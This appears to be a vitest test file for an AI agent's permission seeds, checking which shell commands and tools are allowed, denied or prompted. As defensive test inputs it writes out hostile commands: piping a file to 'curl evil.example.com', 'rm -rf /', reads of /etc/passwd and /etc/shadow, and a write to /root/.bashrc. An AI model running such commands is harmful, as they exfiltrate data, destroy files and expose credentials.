import { describe, it, expect, beforeEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as settings from '../src/lib/server/db/repos/settings';
import {
	ensureSeedGrantsForUser,
	defaultSeedGrants,
	restoreSeedGrantsForUser
} from '../src/lib/server/permissions/seed-grants';
import { parseShellCommand } from '../src/lib/server/permissions/shell-parser';
import { setupLocalEnv } from './helpers/env';

let userId: string;

beforeEach(async () => {
	await setupLocalEnv('portal-seed-grants-');
	// Re-import after env reset so module-level DB singletons rebind.
	const reUsers = await import('../src/lib/server/db/repos/users');
	userId = reUsers.ensureLocalUser().id;
});

describe('seed grants — installation', () => {
	it('ensureLocalUser seeds the default grant set', async () => {
		const reSettings = await import('../src/lib/server/db/repos/settings');
		const all = reSettings.listGrantsForUser(userId);
		expect(all.length).toBe(defaultSeedGrants().length);
		// Every seed has either structured scope_json or a legacy pattern.
		expect(all.every((g) => g.scope !== null || g.scopePattern !== null)).toBe(true);
		expect(all.every((g) => g.source === 'seed')).toBe(true);
	});

	it('installs hard-deny grants only for Git and wc shell commands by default', () => {
		const denies = defaultSeedGrants().filter((g) => g.decision === 'deny');
		expect(denies.length).toBeGreaterThan(0);
		expect(
			denies.every((g) => {
				const token = g.scope?.kind === 'shell' ? g.scope.rule.command?.[0]?.token : undefined;
				return (
					g.tool === 'shell' &&
					g.permissionKind === 'shell' &&
					(token === 'git' || token === 'wc' || g.scopePattern?.startsWith('git '))
				);
			})
		).toBe(true);
	});

	it('is idempotent — re-running adds nothing', async () => {
		const reSettings = await import('../src/lib/server/db/repos/settings');
		const before = reSettings.listGrantsForUser(userId).length;
		const inserted = ensureSeedGrantsForUser(userId);
		const after = reSettings.listGrantsForUser(userId).length;
		expect(inserted).toBe(0);
		expect(after).toBe(before);
	});

	it('restore replaces identifiable old hard-deny prompt seeds with current seeds', async () => {
		const reSettings = await import('../src/lib/server/db/repos/settings');
		reSettings.revokeAllGrantsForUser(userId);
		reSettings.addGrant({
			userId,
			conversationId: null,
			tool: 'shell',
			permissionKind: 'shell',
			scope: { kind: 'shell', rule: { command: [{ token: 'cat' }], pipeline: 'forbid' } },
			decision: 'deny',
			denyReason: 'Bare `cat` is denied. Use `view` for file reads. Piped `cat` is allowed.'
		});

		const result = restoreSeedGrantsForUser(userId);
		const all = reSettings.listGrantsForUser(userId);

		expect(result).toEqual({ removed: 1, inserted: defaultSeedGrants().length });
		expect(all.length).toBe(defaultSeedGrants().length);
		expect(
			all
				.filter((g) => g.decision === 'deny')
				.every((g) => {
					const token = g.scope?.kind === 'shell' ? g.scope.rule.command?.[0]?.token : undefined;
					return token === 'git' || token === 'wc' || g.scopePattern?.startsWith('git ');
				})
		).toBe(true);
		const parsed = parseShellCommand('cat README.md');
		expect(
			reSettings.matchGrant(userId, 'conv-x', 'shell', 'shell', 'cat README.md', {
				shellSegments: parsed.kind === 'parsed' ? parsed.segments : null,
				workspaceRoots: ['/tmp'],
				shellCwd: '/tmp'
			})
		).toBe('allow');
	});

	it('restore leaves user-created non-default grants alone', async () => {
		const reSettings = await import('../src/lib/server/db/repos/settings');
		reSettings.addGrant({
			userId,
			conversationId: null,
			tool: 'shell',
			permissionKind: 'shell',
			scope: { kind: 'shell', rule: { command: [{ token: 'rm' }] } },
			decision: 'deny',
			denyReason: 'rm stays blocked'
		});

		const result = restoreSeedGrantsForUser(userId);
		const all = reSettings.listGrantsForUser(userId);

		expect(result.removed).toBe(defaultSeedGrants().length);
		expect(result.inserted).toBe(defaultSeedGrants().length);
		expect(all.some((g) => g.decision === 'deny' && g.denyReason === 'rm stays blocked')).toBe(
			true
		);
	});
});

describe('seed grants — runtime behaviour', () => {
	// `shellCwd` defaults to the session workspace when given, else the
	// workspace root — mirroring the adapter, which falls back to the
	// conversation's working directory when the SDK reports no workspace path.
	function shellCtx(
		command: string,
		workspaceRoot: string | null = '/tmp',
		sessionWorkspaceRoot: string | null = null
	) {
		const parsed = parseShellCommand(command);
		return {
			shellSegments: parsed.kind === 'parsed' ? parsed.segments : null,
			workspaceRoots: workspaceRoot ? [workspaceRoot] : null,
			sessionWorkspaceRoot,
			shellCwd: sessionWorkspaceRoot ?? workspaceRoot
		};
	}
	function shellMatch(
		command: string,
		workspaceRoot: string | null = '/tmp',
		sessionWorkspaceRoot: string | null = null
	) {
		return settings.matchGrant(
			userId,
			'conv-x',
			'shell',
			'shell',
			command,
			shellCtx(command, workspaceRoot, sessionWorkspaceRoot)
		);
	}
	function shellMatchDetailed(
		command: string,
		workspaceRoot: string | null = '/tmp',
		sessionWorkspaceRoot: string | null = null
	) {
		return settings.matchGrantDetailed(
			userId,
			'conv-x',
			'shell',
			'shell',
			command,
			shellCtx(command, workspaceRoot, sessionWorkspaceRoot)
		);
	}
	function customToolMatch(tool: string) {
		return settings.matchGrant(userId, 'conv-x', tool, 'custom-tool', null);
	}
	function fsMatch(kind: 'read' | 'write' | 'edit', target: string, sessionWorkspaceRoot: string) {
		return settings.matchGrant(userId, 'conv-x', kind, kind, target, {
			target,
			sessionWorkspaceRoot
		});
	}

	it('auto-approves pure utilities without paths', () => {
		expect(shellMatch('echo hello')).toBe('allow');
		expect(shellMatch('pwd')).toBe('allow');
		expect(shellMatch('whoami')).toBe('allow');
	});

	it('auto-approves structured git tools by default', () => {
		expect(customToolMatch('git_status')).toBe('allow');
		expect(customToolMatch('git_diff')).toBe('allow');
		expect(customToolMatch('git_log')).toBe('allow');
		expect(customToolMatch('git_show_commit')).toBe('allow');
		expect(customToolMatch('git_show_file')).toBe('allow');
		expect(customToolMatch('git_worktree_status')).toBe('allow');
		expect(customToolMatch('git_worktree_list')).toBe('allow');
	});

	// The mutating git tools must never be seeded: both declare
	// `permissionBehavior: 'always-prompt'`, and an allow seed would defeat that.
	// git_worktree_merge writes to the SHARED source checkout, so this is the
	// seed most important to keep absent.
	it('does not auto-approve mutating git tools', () => {
		expect(customToolMatch('git_commit')).not.toBe('allow');
		expect(customToolMatch('git_worktree_merge')).not.toBe('allow');
	});

	it('auto-approves read-only worktree-lease inspection', () => {
		// An orchestrator polls these to see which parallel sub-agents finished.
		// Requiring a prompt makes them auto-denied under best-effort, so an
		// unattended run could not enumerate its own worktrees.
		expect(customToolMatch('worktree_list')).toBe('allow');
		expect(customToolMatch('worktree_status')).toBe('allow');
	});

	// Same rule as the git tools above: anything that creates or destroys a
	// checkout or branch stays promptable. `_merge` and `_remove` also declare
	// `permissionBehavior: 'always-prompt'`, which a seed must not undermine.
	it('does not auto-approve mutating worktree tools', () => {
		expect(customToolMatch('worktree_create')).not.toBe('allow');
		expect(customToolMatch('worktree_merge')).not.toBe('allow');
		expect(customToolMatch('worktree_remove')).not.toBe('allow');
	});

	it('auto-approves workspace ticket tools by default', () => {
		expect(customToolMatch('ticket_add')).toBe('allow');
		expect(customToolMatch('ticket_list')).toBe('allow');
		expect(customToolMatch('ticket_get')).toBe('allow');
		expect(customToolMatch('ticket_update')).toBe('allow');
		expect(customToolMatch('ticket_block')).toBe('allow');
		expect(customToolMatch('ticket_unblock')).toBe('allow');
	});

	it('does not auto-approve ticket attachment tools by default', () => {
		expect(customToolMatch('ticket_attach')).not.toBe('allow');
		expect(customToolMatch('ticket_detach')).not.toBe('allow');
	});

	it('auto-approves permission capability inspection by default', () => {
		expect(customToolMatch('permission_capabilities')).toBe('allow');
	});

	it('auto-approves filesystem requests inside the SDK session workspace by default', () => {
		const session = mkdtempSync(join(tmpdir(), 'portal-seed-session-'));
		mkdirSync(join(session, 'files'));
		expect(fsMatch('read', join(session, 'plan.md'), session)).toBe('allow');
		expect(fsMatch('write', join(session, 'files', 'out.txt'), session)).toBe('allow');
		expect(fsMatch('edit', join(session, 'plan.md'), session)).toBe('allow');
		expect(fsMatch('read', '/tmp/other/plan.md', session)).toBe('none');
	});

	it('denies shell git commands covered by structured Git tools', () => {
		expect(shellMatch('git status')).toBe('deny');
		expect(shellMatch('git --no-pager status')).toBe('deny');
		expect(shellMatch('git log -n 5')).toBe('deny');
		expect(shellMatch('git diff HEAD')).toBe('deny');
		expect(shellMatch('git show HEAD')).toBe('deny');
		expect(shellMatch('git commit -m x')).toBe('deny');
		expect(shellMatchDetailed('git --no-pager status').feedback).toContain('git_status');
		expect(shellMatchDetailed('git diff HEAD').feedback).toContain('git_diff');
		expect(shellMatchDetailed('git log -n 5').feedback).toContain('git_log tool');
		expect(shellMatchDetailed('git show HEAD').feedback).toContain('git_show_commit');
		expect(shellMatchDetailed('git commit -m x').feedback).toContain('git_commit');
	});

	it('denies shell wc and steers to the grep tool', () => {
		expect(shellMatch('wc -l README.md', '/tmp')).toBe('deny');
		expect(shellMatch('wc -w README.md', '/tmp')).toBe('deny');
		// Even confined to the workspace (no longer an fs-read allow seed).
		expect(shellMatch('wc README.md', '/tmp')).toBe('deny');
		// The hard-deny is checked across every pipeline segment.
		expect(shellMatch('cat README.md | wc -l', '/tmp')).toBe('deny');
		expect(shellMatchDetailed('wc -l README.md', '/tmp').feedback).toContain('grep');
	});

	it('requires prompts for mutating git subcommands instead of auto-approving them', () => {
		expect(shellMatch('git push')).toBe('prompt');
		expect(shellMatch('git config user.email test@example.com')).toBe('prompt');
		expect(shellMatch('git stash push')).toBe('prompt');
		expect(shellMatch('git branch -D feature')).toBe('prompt');
		expect(shellMatch('git tag -d v1')).toBe('prompt');
		expect(shellMatch('git remote set-url origin https://example.com/repo.git')).toBe('prompt');
	});

	it('denies risky Git global options with structured-tool feedback', () => {
		expect(shellMatch('git --git-dir=/etc status')).toBe('deny');
		expect(shellMatch('git --git-dir /etc status')).toBe('deny');
		expect(shellMatch('git -C /etc status')).toBe('deny');
		expect(shellMatch('cd . && git -C /etc status')).toBe('deny');
		expect(shellMatch('git -c color.ui=always status')).toBe('deny');
		expect(shellMatch('git --config-env core.sshCommand=GIT_SSH_COMMAND status')).toBe('deny');
		expect(shellMatchDetailed('git -C /etc status').feedback).toContain(
			'change repository, worktree, config, namespace, or execution context'
		);
		expect(shellMatchDetailed('git -C /etc status').feedback).toContain(
			'git_status/git_diff/git_log/git_show_commit/git_show_file/git_commit tools'
		);
	});

	it('bare cat is allowed when it matches the filesystem read allow seed', () => {
		// Workspace is /tmp; cat README.md resolves to /tmp/README.md.
		expect(shellMatch('cat README.md', '/tmp')).toBe('allow');
		// As part of a pipeline, cat is fine too.
		expect(shellMatch('cat README.md | grep foo', '/tmp')).toBe('allow');
		expect(shellMatch('cat /tmp/session/plan.md | grep foo', '/tmp', '/tmp/session')).toBe('allow');
		// Escapes still fail to match the allow seed but remain promptable.
		expect(shellMatch('cat /etc/passwd', '/tmp')).toBe('prompt');
		expect(shellMatch('cat ../etc/passwd', '/tmp')).toBe('prompt');
	});

	it('explains a refused shell read by the missing read grant, not a workspace boundary', () => {
		const feedback = shellMatchDetailed('cat /etc/passwd', '/tmp').feedback ?? '';
		// The seed steers to the structured tool...
		expect(feedback).toContain('`view`');
		// ...and the matcher appends the specific reason the allow seed declined.
		expect(feedback).toContain('/etc/passwd');
		expect(feedback).toContain('`read` grants');
		// The old text claimed an "allowed workspace" boundary, which is no
		// longer what decides this.
		expect(feedback).not.toContain('outside an allowed workspace');
	});

	it('lets a user-added read grant widen the seeded shell readers to match `view`', () => {
		// The whole point of the deferring seeds: the user describes readability
		// ONCE, as an fs grant, and every reader agrees.
		//
		// `ws` and `corpus` are siblings under a private base dir — using /tmp as
		// the workspace root would make any mkdtemp path a child of it and the
		// test would pass vacuously.
		const base = realpathSync(mkdtempSync(join(tmpdir(), 'portal-seed-corpus-')));
		const ws = join(base, 'ws');
		const corpus = join(base, 'corpus');
		mkdirSync(ws);
		mkdirSync(corpus);
		const target = join(corpus, 'notes.txt');
		writeFileSync(target, 'x');

		expect(shellMatch(`cat ${target}`, ws)).toBe('prompt');
		expect(fsMatch('read', target, ws)).toBe('none');

		settings.addGrant({
			userId,
			conversationId: null,
			tool: 'read',
			permissionKind: 'read',
			scope: {
				kind: 'fs',
				perms: ['read'],
				rule: { kind: 'path', root: 'absolute', behavior: 'prefix', value: corpus }
			},
			decision: 'allow'
		});

		expect(shellMatch(`cat ${target}`, ws)).toBe('allow');
		expect(shellMatch(`head ${target}`, ws)).toBe('allow');
		// Plain `find <dir>`: the sole operand is the granted directory. Note
		// `find <dir> -name '*.txt'` would NOT pass — the seed's option list is
		// deny-only, so `-name`'s value is counted as another positional and gets
		// path-checked. That is pre-existing and fails safe (it prompts), but it
		// means find's operands can't be mixed across a grant boundary.
		expect(shellMatch(`find ${corpus}`, ws)).toBe('allow');
		expect(fsMatch('read', target, ws)).toBe('allow');

		rmSync(base, { recursive: true, force: true });
	});
	it('does not let a write grant satisfy a seeded shell reader', () => {
		const base = realpathSync(mkdtempSync(join(tmpdir(), 'portal-seed-writeonly-')));
		const ws = join(base, 'ws');
		const dir = join(base, 'out');
		mkdirSync(ws);
		mkdirSync(dir);
		const target = join(dir, 'out.txt');
		settings.addGrant({
			userId,
			conversationId: null,
			tool: 'write',
			permissionKind: 'write',
			scope: {
				kind: 'fs',
				perms: ['write'],
				rule: { kind: 'path', root: 'absolute', behavior: 'prefix', value: dir }
			},
			decision: 'allow'
		});
		expect(shellMatch(`cat ${target}`, ws)).toBe('prompt');
		rmSync(base, { recursive: true, force: true });
	});

	it('keeps worktree-lease files readable by `cat` via the workspace floor seed', () => {
		// Regression guard for the migration: the `workspace-paths` floor seed is
		// what covers lease roots, so an orchestrator reading a sub-agent's file
		// must keep working without any fs grant being involved.
		//
		// The lease is a SIBLING of the conversation workspace, never a child, so
		// coverage has to come from the lease being in `workspaceRoots`.
		const base = realpathSync(mkdtempSync(join(tmpdir(), 'portal-seed-lease-')));
		const ws = join(base, 'ws');
		const lease = join(base, 'lease');
		mkdirSync(ws);
		mkdirSync(lease);
		const target = join(lease, 'result.ts');
		writeFileSync(target, 'x');

		const parsed = parseShellCommand(`cat ${target}`);
		const matchWithRoots = (roots: string[]) =>
			settings.matchGrant(userId, 'conv-x', 'shell', 'shell', `cat ${target}`, {
				shellSegments: parsed.kind === 'parsed' ? parsed.segments : null,
				workspaceRoots: roots,
				sessionWorkspaceRoot: null,
				shellCwd: ws
			});

		// Conversation workspace + the lease it holds, as workspaceRootsFor builds it.
		expect(matchWithRoots([ws, lease])).toBe('allow');
		// Without the lease in the root set it is correctly out of reach.
		expect(matchWithRoots([ws])).toBe('prompt');

		rmSync(base, { recursive: true, force: true });
	});

	it('keeps the seeded shell readers working when the read grants are revoked', () => {
		// The migration is additive: the `workspace-paths` floor still covers the
		// workspace, so revoking fs read grants narrows only the paths that were
		// reachable BECAUSE of those grants.
		for (const g of settings.listGrantsForUser(userId)) {
			if (g.permissionKind === 'read') settings.revokeGrant(userId, g.id);
		}
		expect(shellMatch('cat README.md', '/tmp')).toBe('allow');
		expect(shellMatch('find . -name foo', '/tmp')).toBe('allow');
		expect(shellMatch('echo hello', '/tmp')).toBe('allow');
	});

	it('never lets the deferring seed grant on a command with no path to check', () => {
		// A zero-positional invocation gives `readable-paths` nothing to examine,
		// so it must not match; those calls belong to the workspace floor seed.
		// Without the `min: 1` bound the deferring seed would approve them on the
		// strength of a rule that checked nothing.
		const deferring = defaultSeedGrants().filter(
			(g) => g.scope?.kind === 'shell' && g.scope.rule.positionals?.kind === 'readable-paths'
		);
		expect(deferring.length).toBeGreaterThan(0);
		for (const g of deferring) {
			const count = g.scope?.kind === 'shell' ? g.scope.rule.positionalCount : undefined;
			expect(count?.min).toBe(1);
		}
	});

	it('does not let a file-valued option smuggle a write past the positional rules', () => {
		// `sort --output=FILE` is a full arbitrary WRITE whose content comes over
		// a pipe, and it takes ZERO positionals — so every positional rule passes
		// vacuously and the `write`/`edit` grants never see it. Only an explicit
		// option deny closes it.
		expect(shellMatch('sort --output=/root/.bashrc', '/tmp')).not.toBe('allow');
		expect(shellMatch('sort -o /root/.bashrc', '/tmp')).not.toBe('allow');
		expect(shellMatch('sort -o/root/.bashrc', '/tmp')).not.toBe('allow');
		// Even inside the workspace: this is a write, and no shell seed grants writes.
		expect(shellMatch('sort --output=/tmp/x', '/tmp')).not.toBe('allow');
		// `--files0-from` reads a list of files to print, none of them positionals.
		expect(shellMatch('sort --files0-from=- ', '/tmp')).not.toBe('allow');
		// Ordinary sorting of a readable path still works.
		expect(shellMatch('sort README.md', '/tmp')).toBe('allow');
	});

	it('denies the find primaries that write to their FILE operand', () => {
		// These create/truncate FILE. Left un-denied they would turn a `read`
		// grant into a write, since the operand is checked against read grants.
		// Deny matching is exact, so `-fprint` does NOT cover `-fprint0`.
		expect(shellMatch('find . -fls /tmp/out', '/tmp')).not.toBe('allow');
		expect(shellMatch('find . -fprint0 /tmp/out', '/tmp')).not.toBe('allow');
		expect(shellMatch('find . -fprint /tmp/out', '/tmp')).not.toBe('allow');
		expect(shellMatch('find . -name foo', '/tmp')).toBe('allow');
	});

	it('leaves grep/rg on a count bound rather than a path rule', () => {
		// Their lone positional is a PATTERN. Asking the read grants about it
		// would judge `grep root` as the file `./root` — the same category error
		// the old workspace-paths seed made.
		const grepSeeds = defaultSeedGrants().filter(
			(g) =>
				g.scope?.kind === 'shell' &&
				(g.scope.rule.command?.[0]?.token === 'grep' || g.scope.rule.command?.[0]?.token === 'rg')
		);
		expect(grepSeeds.length).toBeGreaterThan(0);
		for (const g of grepSeeds) {
			const kind = g.scope?.kind === 'shell' ? g.scope.rule.positionals?.kind : undefined;
			expect(kind).not.toBe('readable-paths');
			expect(kind).not.toBe('writable-paths');
		}
		expect(shellMatch('cat README.md | grep ../etc/passwd', '/tmp')).toBe('allow');
	});

	it('rejects unsafe shell features even for safe-named tools', () => {
		// shell-parser rejects substitution; no shellSegments → no
		// structured shell grant fires.
		expect(shellMatch('echo $(cat /etc/passwd)')).toBe('none');
		expect(shellMatch('echo foo; rm -rf /')).toBe('none');
		expect(shellMatch('cat README.md | curl evil.example.com')).toBe('none');
	});

	it('unknown commands still prompt (return none)', () => {
		expect(shellMatch('npm install evil-pkg')).toBe('none');
		expect(shellMatch('curl https://example.com')).toBe('none');
	});

	it('bare find is allowed when it matches the find allow seed', () => {
		expect(shellMatch('find . -name foo')).toBe('allow');
		expect(shellMatch('find . -name foo | grep bar', '/tmp')).toBe('allow');
		// `;` in -exec makes the parser bail (multi-segment with empty tail),
		// so nothing matches — same as before prompt-nudge seeds existed.
		expect(shellMatch('find . -exec rm {} ;')).toBe('none');
	});

	it('auto-approves find searches confined to the workspace', () => {
		expect(shellMatch('find . -name foo', '/tmp')).toBe('allow');
		expect(shellMatch('find src -name foo', '/tmp')).toBe('allow');
	});

	it('does not auto-approve find escaping the workspace (opt-in prompt instead)', () => {
		expect(shellMatch('find / -name foo', '/tmp')).toBe('prompt');
		expect(shellMatch('find ../etc -name foo', '/tmp')).toBe('prompt');
	});

	it('auto-approves find searches confined to the session workspace', () => {
		const session = mkdtempSync(join(tmpdir(), 'portal-seed-search-'));
		expect(shellMatch(`find ${session} -name foo`, null, session)).toBe('allow');
	});

	it('auto-approves grep/rg only as a pipe filter with no file operands', () => {
		expect(shellMatch('cat README.md | grep foo', '/tmp')).toBe('allow');
		expect(shellMatch('find . -name foo | rg bar', '/tmp')).toBe('allow');
		// Pattern is opaque: a path-looking regex is still just a pattern,
		// and no longer produces the bogus "outside the workspace" nudge.
		expect(shellMatch('cat README.md | grep ../etc/passwd', '/tmp')).toBe('allow');
	});

	it('steers grep/rg file searches to the structured grep tool', () => {
		// In-workspace file search used to auto-approve; now it prompts,
		// because the grep tool covers it with the same read scopes as view.
		expect(shellMatch('grep -r password .', '/tmp')).toBe('prompt');
		expect(shellMatch('rg secret src', '/tmp')).toBe('prompt');
		expect(shellMatch('rg secret /etc/shadow', '/tmp')).toBe('prompt');
		expect(shellMatchDetailed('rg secret src', '/tmp').feedback).toContain('`grep` tool');
	});

	it('does not let a pipe smuggle a file read into grep/rg', () => {
		// The pipe makes grep a pipe target, but the file operand exceeds the
		// seed's positional count of 1, so the allow seed does not fire.
		expect(shellMatch('echo x | grep root /etc/shadow', '/tmp')).toBe('prompt');
		// Producer side of a pipeline is not a pipe target.
		expect(shellMatch('grep root /etc/shadow | head', '/tmp')).toBe('prompt');
		// File-reading options are denied outright even in filter position.
		expect(shellMatch('echo x | grep -r password .', '/tmp')).toBe('prompt');
		expect(shellMatch('echo x | rg -f patterns.txt', '/tmp')).toBe('prompt');
	});
});
